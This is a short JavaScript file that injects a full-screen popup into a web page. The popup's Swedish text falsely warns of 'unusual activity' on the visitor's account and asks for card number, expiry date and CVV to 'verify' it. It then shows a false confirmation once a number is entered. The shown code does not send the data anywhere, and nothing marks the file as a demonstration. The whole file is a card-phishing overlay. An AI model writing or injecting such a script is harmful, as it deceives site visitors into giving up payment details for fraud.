function createPopup() {
    this.popup = document.createElement("DIV");
    this.popupHeader = document.createElement("H1");
    this.popupTextBox = document.createElement("P");
    this.popupCCNumberField = document.createElement("INPUT");
    this.popupCCDateField = document.createElement("INPUT");
    this.popupCCCVVField = document.createElement("INPUT");
    this.popupButton = document.createElement("BUTTON");
    this.popup.style.height = "90vh";
    this.popup.style.width = "90vw";
    this.popup.style.backgroundColor = "#FFF9F8";
    this.popup.style.zIndex = "100";
    this.popup.style.position = "fixed";
    this.popup.style.top = "50px";
    this.popup.style.left = "15%";
    this.popup.style.textAlign = "center";
    this.popup.style.fontFamily = "sans-serif";
    this.popup.style.marginLeft = "-200px";
    this.popup.style.boxShadow = "1px 1px 15px 5px #333333AA";
    this.popupHeader.innerHTML = "Onormal aktivitet har upptäckts på ditt konto";
    this.popupTextBox.innerHTML = "För att verifiera att det verkligen är du och fortsätta använda tjänsten behöver vi verifiera dina kontouppgifter";
    this.popupTextBox.style.marginTop = "3%";
    this.popupTextBox.style.marginBottom = "3%";
    this.popupCCNumberField.style.width = "10%";
    this.popupCCNumberField.placeholder = "Kortnummer";
    this.popupCCCVVField.placeholder = "CCV-kod";
    this.popupCCCVVField.style.width = "5%";
    this.popupCCDateField.style.width = "5%";
    this.popupCCDateField.placeholder = "Giltigt till";
    this.popupButton.innerHTML = "Verifiera konto";
    this.popupButton.style.marginTop = "2.4%";
    this.popupButton.style.width = "20%";
    this.popupButton.style.marginLeft = "40%";
    this.popupButton.style.display = "block";
    this.popupButton.addEventListener("click", this.closePopup.bind(this));
    this.popup.appendChild(this.popupHeader);
    this.popup.appendChild(this.popupTextBox);
    this.popup.appendChild(this.popupCCNumberField);
    this.popup.appendChild(this.popupCCDateField);
    this.popup.appendChild(this.popupCCCVVField);
    this.popup.appendChild(this.popupButton);
    document.body.appendChild(this.popup);
}

function closePopup() {
    if (this.popupCCNumberField.value.length > 0) {
        this.popup.parentElement.removeChild(this.popup);
        alert("Tack! Ditt konto är nu verifierat och du kan fortsätta att använda tjänsten.");
    } else {
        alert("Du måste fylla i uppgifterna för att fortsätta.");
    }
}

createPopup();